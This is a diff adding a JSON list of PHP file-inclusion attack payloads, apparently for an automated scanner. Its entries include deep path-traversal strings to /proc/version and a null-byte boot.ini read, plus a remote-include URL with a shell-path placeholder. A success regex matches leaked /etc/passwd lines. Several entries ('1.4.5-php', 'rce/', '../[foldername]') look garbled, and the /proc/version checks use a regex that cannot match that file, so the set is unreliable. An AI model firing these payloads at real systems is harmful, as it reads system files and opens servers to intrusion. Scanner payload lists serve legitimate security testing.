@@ -1,0 +1,79 @@
+[
+  {
+    "payload_id": "OWP-60382",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "../[foldername]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-61145",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "/../../../../../../../../../../proc/version",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-61146",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "../../../../../../../../../../proc/version",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-63066",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "http://[Shell-Path]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-63278",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "1.4.5-php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-63870",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "../../../../../../../../../../../../../../boot.ini\u0000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-64692",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "rce/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  }
+]
